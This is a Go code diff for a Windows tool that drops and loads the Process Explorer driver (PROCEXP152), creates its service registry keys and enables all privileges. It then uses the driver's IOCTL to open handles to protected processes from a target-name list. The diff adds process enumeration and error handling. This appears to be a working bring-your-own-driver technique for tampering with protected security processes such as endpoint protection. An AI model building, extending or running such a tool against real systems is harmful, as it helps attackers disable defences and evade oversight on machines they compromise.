@@ -4,6 +4,7 @@ import (
 	_ "embed"
 	"errors"
 	"fmt"
+	"log"
 	"os"
 	"path/filepath"
 	"strings"
@@ -44,27 +45,51 @@ func procexp_protected_process(volume_Handle windows.Handle, pid int) (windows.H
 	ret := windows.DeviceIoControl(volume_Handle, 0x8335003c, (*byte)(unsafe.Pointer(&process_id)), 4, (*byte)(unsafe.Pointer(&handle)), 0, &local, nil)
 	fmt.Println("[INFO] Open protected process result:", ret)
 	if ret != nil {
-		return nil, errors.New("[-] Error while accessing protected process")
+		return handle, errors.New("[-] Error while accessing protected process")
 	}
 
 	return handle, nil
-
 }
 
-func get_target_pid(process string) ([]int, error) {
-	windows.Process32First()
+func get_processes_snapshot() (windows.Handle, error) {
+	var handle windows.Handle
+	handle, e := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if e != nil {
+		return handle, e
+	} else {
+		return handle, nil
+	}
+}
 
+func get_target_pid(handle_snapshot windows.Handle, name string) ([]uint32, error) {
+	// thanks to https://stackoverflow.com/questions/36333896/how-to-get-process-id-by-process-name-in-windows-environment
+	// unsafe.Sizeof(windows.ProcessEntry32{})
+	const process_entry_size = 568
+	var res []uint32
+
+	p := windows.ProcessEntry32{Size: process_entry_size}
+	for {
+		e := windows.Process32Next(handle_snapshot, &p)
+		if e != nil {
+			return res, e
+		}
+		if windows.UTF16ToString(p.ExeFile[:]) == name {
+			res = append(res, p.ProcessID)
+		}
+	}
+	return res, nil
 }
 
 func connect_procexp_device() (windows.Handle, error) {
-	var Handle windows.Handle
-	var volume_name = fmt.Sprintf("\\\\.\\PROCEXP152")
-	Handle, err := windows.CreateFile(windows.StringToUTF16Ptr(volume_name), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)
+	var handle windows.Handle
+	volume_name := "\\\\.\\PROCEXP152"
+	fmt.Println("[INFO] ", windows.StringToUTF16Ptr(volume_name))
+	handle, err := windows.CreateFile(windows.StringToUTF16Ptr(volume_name), windows.GENERIC_ALL, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
 	if err != nil {
-		return nil, errors.New("[-] Error while creating volume for procexp")
+		return handle, err
 	}
 
-	return Handle, nil
+	return handle, nil
 }
 
 func unload_driver(drivername string) error {
@@ -75,7 +100,7 @@ func unload_driver(drivername string) error {
 
 	namep, err := windows.UTF16PtrFromString(registry)
 	if err != nil {
-		return errors.New("[-] Error while converting name to unicode")
+		return err
 	}
 
 	_, _, err = proc.Call(uintptr(*namep))
@@ -94,13 +119,16 @@ func load_driver(drivername string) error {
 
 	namep, err := windows.UTF16PtrFromString(registry)
 	if err != nil {
-		return errors.New("[-] Error while converting name to unicode")
+		return err
 	}
 
 	_, _, err = proc.Call(uintptr(*namep))
 
+	if err != windows.STATUS_SUCCESS && err != windows.STATUS_IMAGE_ALREADY_LOADED && err != windows.STATUS_OBJECT_NAME_COLLISION {
+		fmt.Println("[INFO] Driver loading result is:", err)
+	}
+
 	// TODO: Handle the driver errors ?
-	fmt.Println("[INFO] Driver loading result is:", err)
 
 	return nil
 }
@@ -110,7 +138,7 @@ func adjust_privilege() error {
 
 	token, err := wintoken.OpenProcessToken(current_pid, wintoken.TokenPrimary)
 	if err != nil {
-		return errors.New("[-] Error while getting current token Handle")
+		return err
 	}
 	defer token.Close()
 
@@ -122,7 +150,7 @@ func adjust_privilege() error {
 func remove_registry_keys(drivername, driverpath string) error {
 	err := registry.DeleteKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername)
 	if err != nil {
-		return errors.New("[-] Error while deleting registry key")
+		return err
 	} else {
 		return nil
 	}
@@ -131,7 +159,7 @@ func remove_registry_keys(drivername, driverpath string) error {
 func delete_driver(driverpath string) error {
 	err := os.Remove(driverpath)
 	if err != nil {
-		return errors.New("[-] Error while erasing the driver from disk")
+		return err
 	} else {
 		return nil
 	}
@@ -141,43 +169,43 @@ func create_registry_keys(drivername, driverpath string) error {
 	permission := uint32(registry.QUERY_VALUE | registry.SET_VALUE)
 	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\"+drivername, permission)
 	if err != nil {
-		return errors.New("[-] Error while creating registry keys")
+		return err
 	}
 
 	err = key.SetDWordValue("Type", 0)
 	if err != nil {
-		return errors.New("[-] Error while setting registry key Type")
+		return err
 	}
 
 	err = key.SetDWordValue("ErrorControl", 0)
 	if err != nil {
-		return errors.New("[-] Error while setting registry key ErrorControl")
+		return err
 	}
 
 	err = key.SetStringValue("ImagePath", driverpath)
 	if err != nil {
-		return errors.New("[-] Error while setting registry key ImagePath")
+		return err
 	}
 
 	return nil
 }
 
 func write_driver(driver []byte) (string, error) {
-	binary_name := "PROCEXP"
+	binary_name := "PROCEXP152.sys"
 	f, err := os.Create(binary_name)
 	if err != nil {
-		return "", errors.New("[-] Error while creating PROCEXP file")
+		return "", err
 	}
 	defer f.Close()
 
 	_, err = f.Write(driver)
 	if err != nil {
-		return "", errors.New("[-] Error while writing bytes to PROCEXP file")
+		return "", err
 	}
 
 	current_dir, err := os.Getwd()
 	if err != nil {
-		return "", errors.New("[-] Error while getting current working directory")
+		return "", err
 	}
 	res := filepath.Join(current_dir, binary_name)
 
@@ -218,12 +246,6 @@ func check_args() (string, error) {
 	}
 }
 
-func check(e error) {
-	if e != nil {
-		panic(e)
-	}
-}
-
 func main() {
 	const DRIVERNAME string = "ProcExp64"
 
@@ -235,37 +257,57 @@ func main() {
 	}
 
 	arg, err := check_args()
-	check(err)
+	if err != nil {
+		log.Fatal("[-] Incorrect number of arguments giver. Details:", err)
+	}
 	fmt.Println(arg)
 
 	driverpath, err := write_driver(driver)
-	check(err)
-	fmt.Println("[+] Successfully wrote driver to disk")
 	defer delete_driver(driverpath)
+	if err != nil {
+		log.Fatal("[-] Error while writing driver to disk. Details:", err)
+	}
+	fmt.Println("[+] Successfully wrote driver to disk")
 
 	err = create_registry_keys(DRIVERNAME, driverpath)
-	check(err)
-	fmt.Println("[+] Successfully wrote registry keys")
 	defer remove_registry_keys(DRIVERNAME, driverpath)
+	if err != nil {
+		log.Fatal("[-] Error while creating registry keys. Details:", err)
+	}
+	fmt.Println("[+] Successfully wrote registry keys")
 
 	err = adjust_privilege()
-	check(err)
+	if err != nil {
+		log.Fatal("[-] Error while enabling all privileges for the current process. Details:", err)
+	}
 	fmt.Println("[+] Successfully enabled all privileges for the current process")
 
 	process_list := load_process_names(content_processes)
 	fmt.Println(process_list)
 
 	err = load_driver(DRIVERNAME)
-	check(err)
-	fmt.Println("[+] Successfully loaded PROCEXP driver")
 	defer unload_driver(DRIVERNAME)
+	if err != nil {
+		log.Fatal("[-] Error while loading procexp driver. Details:", err)
+	}
+	fmt.Println("[+] Successfully loaded procexp driver")
 
 	volume_Handle, err := connect_procexp_device()
-	check(err)
-	fmt.Println("[+] Successfully connected to PROCEXP driver")
+	defer windows.CloseHandle(volume_Handle)
+	if err != nil {
+		log.Fatal("[-] Error while connecting to loaded driver. Details:", err)
+	}
+	fmt.Println("[+] Successfully connected to procexp driver")
+
+	handle_snapshot, err := get_processes_snapshot()
+	defer windows.CloseHandle(handle_snapshot)
+	if err != nil {
+		log.Fatal("[-] Error while getting processes snapshot. Details:", err)
+	}
+	fmt.Println("[+] Successfully retrieved all running processes")
 
 	for i := 0; i < len(process_list); i++ {
-		pid_list, _ := get_target_pid(process_list[i])
+		pid_list, _ := get_target_pid(handle_snapshot, process_list[i])
 		if err != nil {
 			fmt.Println("[-] Error while retrieving PID for", process_list[i])
 		}
@@ -280,4 +322,5 @@ func main() {
 			}
 		}
 	}
+	fmt.Println("It was a pleasure, goodbye!")
 }
